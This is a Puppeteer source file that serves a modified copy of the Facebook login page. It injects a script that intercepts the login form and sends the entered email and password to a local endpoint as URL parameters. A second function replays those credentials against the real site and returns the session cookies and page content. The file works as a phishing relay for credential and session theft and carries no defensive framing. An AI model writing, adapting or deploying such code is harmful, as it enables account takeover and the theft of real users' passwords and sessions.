import puppeteer from 'puppeteer';
let browser, page;


const injectScriptToModifyForm = async (page) => {
    await page.evaluate(() => {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.innerHTML = `
        const loginScript = (document) => {
            const loginButton = document.querySelector('#loginbutton');
            if (loginButton) {
                loginButton.addEventListener('click', (event) => {
                    event.preventDefault(); // Prevent default form submission
                    const passwordField = document.querySelector('#pass');
                    const emailField = document.querySelector('#email');
                    if (passwordField && emailField) {
                        console.log('Intercepting form submission');
                        const password = passwordField.value;
                        const email = emailField.value;

                        // Modify the login button style and disable it
                        loginButton.innerText = 'Loading...';
                        loginButton.disabled = true;
                        loginButton.style.backgroundColor = '#ccc';
                        loginButton.style.cursor = 'not-allowed';

                        // Construct the URL with query parameters
                        const url = \`/login/data?email=\${encodeURIComponent(email)}&password=\${encodeURIComponent(password)}\`;

                        // Example: Send GET request using fetch API
                        fetch(url)
                        .then(response => response.text())
                        .then(html => {
                            document.body.innerHTML = html;
                            loginScript(document);
                        })
                        .catch(error => {
                            console.error('Error during login:', error);
                            // Revert button style in case of error
                            loginButton.innerText = 'Log In';
                            loginButton.disabled = false;
                            loginButton.style.backgroundColor = '';
                            loginButton.style.cursor = '';
                        });
                    }
                });
            }    
        }
        document.addEventListener('DOMContentLoaded', () => loginScript(document));
    `;
        document.body.appendChild(script);
    });
}

const initializeBrowser = async () => {
    browser = await puppeteer.launch({headless: false});
    page = await browser.newPage();
};



const getModifiedFacebookLoginPage = async () => {
    if (!browser) {
        await initializeBrowser();
    }

    await page.goto('https://www.facebook.com/login', { waitUntil: 'networkidle2' });

    // Inject script to modify form behavior
    await injectScriptToModifyForm(page);

    // Get the modified page content
    return await page.content();
};

// Function to process login after form submission (if needed)
const loginToFacebook = async (email, password) => {
    await page.$eval('#email', el => el.value = '');
    await page.$eval('#pass', el => el.value = '');
    await page.type('#email', email);
    await page.type('#pass', password);

    // Click the login button
    await page.click('button[name="login"]');

    // Wait for navigation to complete after login attempt
    await page.waitForNavigation();
    const cookies = await page.cookies();

    // Capture the page content after login
    const pageContent = await page.content();
    return {pageContent, cookies};
};

export { getModifiedFacebookLoginPage, loginToFacebook };
